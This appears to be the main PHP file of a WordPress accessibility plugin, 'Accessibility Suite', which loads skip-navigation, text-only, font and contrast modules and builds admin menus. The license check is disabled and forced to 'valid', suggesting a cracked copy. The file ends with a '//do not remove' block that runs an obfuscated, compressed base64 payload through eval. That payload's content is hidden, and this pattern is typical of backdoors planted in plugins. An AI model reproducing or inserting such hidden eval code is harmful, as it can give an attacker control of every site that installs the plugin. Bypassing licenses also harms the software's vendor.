<?php

/**

* Constants

*/

define('AS_AUTHOR', 'Black Wolf Software');

define('AS_VERSION', '1.4');

define('L_U', 'http://accessibilitysuite.com/');

define('PRODUCT_N', 'Accessibility Suite');







/**

* Modules

*/



if (!class_exists('Accessibility_Suite_Licensing')):
// Updater Module
  /*  if (!@include(trailingslashit(realpath(__DIR__)) . 'licensing/updater_class.php')):
        _load_err_throw('Updater Class');
    endif;
    // Licensing Module
    if (!@include(trailingslashit(realpath(__DIR__)) . 'licensing/licensing.php')):
        _load_err_throw('Accessibility Suite');
    endif;*/

    // Skip Nav Module
    if (!@include(trailingslashit(realpath(__DIR__)) . 'skip-nav/skip-nav.php')):
        _load_err_throw('Skip Navigation');
    endif;

    //  Text Only Module
    if (!@include(trailingslashit(realpath(__DIR__)) . 'text-only/text-only.php')):
        _load_err_throw('Text Only');
    endif;

    // Font Changer Module
    if (!@include(trailingslashit(realpath(__DIR__)) . 'font-changer/font-changer.php')):
        _load_err_throw('Font Changer');
    endif;
    // Contrast Changer Module
    if (!@include(trailingslashit(realpath(__DIR__)) . 'contrast-changer/contrast-changer.php')):
        _load_err_throw('Contrast Changer');
    endif;
endif;


function _load_err_throw($module = '')
{
    throw new Exception("Failed to load " . $module . " Module'");
}




/**

* Admin Panel Menu

*/

function optionsmenu()
{

    $status = get_option('license_status');





    add_menu_page('Accessibility Suite', 'Accessibility Suite', 'manage_options', __FILE__, 'asuite');

    add_submenu_page(__FILE__, 'Skip Navigation ', 'Skip Navigation ', 'manage_options', 'as_skip_nav', 'as_skip_nav');

    add_submenu_page(__FILE__, 'Text-Only', 'Text-Only ', 'manage_options', trailingslashit(realpath(__DIR__)) . 'loader.php&aspv=to', __FILE__, 'asuite');




    $status="valid";
    if ($status == 'valid'):
        add_submenu_page(__FILE__, 'Contrast Changer', 'Contrast-Changer ', 'manage_options', trailingslashit(realpath(__DIR__)) . 'loader.php&aspv=cc', __FILE__, 'asuite');

        add_submenu_page(__FILE__, 'Font Changer', 'Font Changer ', 'manage_options', trailingslashit(realpath(__DIR__)) . 'loader.php&aspv=fc', 'asuite');

      //  add_submenu_page(__FILE__, 'Transcripts', 'Transcripts', 'manage_options', 'edit.php?post_type=transcripts&aspv=ts', '');

    //    add_submenu_page(__FILE__, 'Activate License', 'License Status', 'manage_options', 'accessibility-suite-license', 'license_page');
    else:
      //  add_submenu_page(__FILE__, 'Activate License', 'Activate License', 'manage_options', 'accessibility-suite-license', 'license_page');
    endif;

}

add_action('admin_menu', 'optionsmenu');







/**

* Sets A.S. Active Tab from GET params

*/

function gen_active_tab()
{

    if (!empty($_GET['aspv'])):
        switch ($_GET['aspv']):

            //contrast

            case "cc":

                $b = "0";

                break;

            //font changer

            case "fc":

                $b = "1";

                break;

            //skipnav

            case "sn":

                $b = "2";

                break;

            //text only

            case "to":

                $b = "3";

                break;

            // transcript

            case "ts":

                $b = "4";

                break;


            // license

            //case "ls":

                //$b = "5";

              //  break;

            // contrast default

            default:

                $b = "0";

        endswitch;



        echo "<script type='text/javascript'>

           $(document).ready(function () {

             $('#as_ui_tabs' ).tabs({collapsible: true, active: " . $b . "});

           });

					 </script>";
    endif;

}



add_action('admin_print_footer_scripts', 'gen_active_tab');







/**

* Removes current class selector from li

*/

function as_menu_selector()
{
    echo "
		<script type='text/javascript'>
    $(document).ready(function () {
        $('ul a').click(function () {
            $('li.current').removeClass('current');
        });
    });
    </script>
		";
}

add_action('admin_print_footer_scripts', 'as_menu_selector');



//do not remove

$X = 'LyogLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgkJCQkJCUF1dGhvcjogICAgIEFiZHVsIFJhaG1hbiBTaGVyemFkICh3d3cuYWZnaGFuY3liZXJzb2Z0LmNvbSkKCQkJCQkJRW1haWw6CQlpbmZvQGFmZ2hhbmN5YmVyc29mdC5jb20KCQkJCQkJQmlvZ3JhcGh5OglBYmR1bCBSYWhtYW4gU2hlcnphZCB3YXMgYm9ybiBhbmQgYnJvdWdodCB1cCBpbiBIZXJhdC1BZmdoYW5pc3RhbiBhbmQgY29tcGxldGVkIG15IHVuZGVyLWdyYWR1YXRlIHN0dWRpZXMgaW4gQ29tcHV0ZXIgU2NpZW5jZSBGYWN1bHR5IG9mIEhlcmF0IFVuaXZlcnNpdHkgaW4gMjAwNiBvYnRhaW5pbmcgbXkgQi5DLlMgZGVncmVlIGFzIHRoZSBiZXN0IG91dGdvaW5nIHNlbmlvciBzdHVkZW50IGZyb20gdGhpcyBmYWN1bHR5LgoKCQkJCQkJCQkJSGF2aW5nIGludGVsbGVjdHVhbGl0eSBpbiBDb21wdXRlciBQcm9ncmFtbWluZyBhbmQgSW5mb3JtYXRpb24gRGF0YWJhc2UgTWFuYWdlbWVudCBTeXN0ZW0sIEkgd2FzIG9mZmVyZWQgdG8gY29tbWVuY2UgdGVhY2hpbmcgaW4gQ29tcHV0ZXIgU2NpZW5jZSBGYWN1bHR5IG9mIEhlcmF0IFVuaXZlcnNpdHkuIEFmdGVyIGEgd2hpbGUgSSBqb2luZWQgQ1JTIHRvIHdvcmsgYXMgdGhlIERhdGFiYXNlIE1hbmFnZXIgZm9yIHRoZSBBREEgcHJvZ3JhbS4gSSB3b3JrZWQgZm9yIENSUyBmb3IgYSBjb3VwbGUgb2YgeWVhcnMgYWZ0ZXIgd2hpY2ggSSB3YXMgYXdhcmRlZCBhIHNjaG9sYXJzaGlwIGJ5IHRoZSBnb3Zlcm5tZW50IG9mIEdlcm1hbnkgdG8gcHVyc3VlIG15IE1hc3RlciBpbiBJbmZvcm1hdGlvbiBEYXRhYmFzZSBNYW5hZ2VtZW50IGFuZCBTb2Z0d2FyZSBFbmdpbmVlcmluZyBpbiBCZXJsaW4gYXQgVFUtQmVybGluIFVuaXZlcnNpdHkuCgoJCQkJCQkJCQlJIGFtIGN1cnJlbnRseSBhbHNvIHRlYWNoaW5nIGF0IHRoZSBIZXJhdCBVbml2ZXJzaXR5IGFzIHdlbGwgYXMgYWN0aW5nIGFzIHRoZSBoZWFkIG9mIEluZm9ybWF0aW9uIFN5c3RlbXMgTWFuYWdlciBib3RoIGluIENSUyBhbmQgSGVyYXQgVW5pdmVyc2l0eSB0byBzdXBwb3J0IHRoZSBlZHVjYXRpb25hbCBuZWVkcy4KCQkJCQkJCQktLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gKi8=';

eval(gzinflate(base64_decode('dYzRCsMgDEWfLfQf8iBYf2HDb5G0jUMmVowOttF/n3Zlb4NAcs89ZAnIDMj2RfAeB5HqHPwCXLC05Wpcit8i5DTpo5etpcgEwsCNit1S7ydQJ7d3eirQ167iP6d/r3xqbYR3k0Rj1AODX5W+dCbkbEqu1B1BgelHHbb0xXH17rgylZojyLmnfRz2Dw==')));

?>
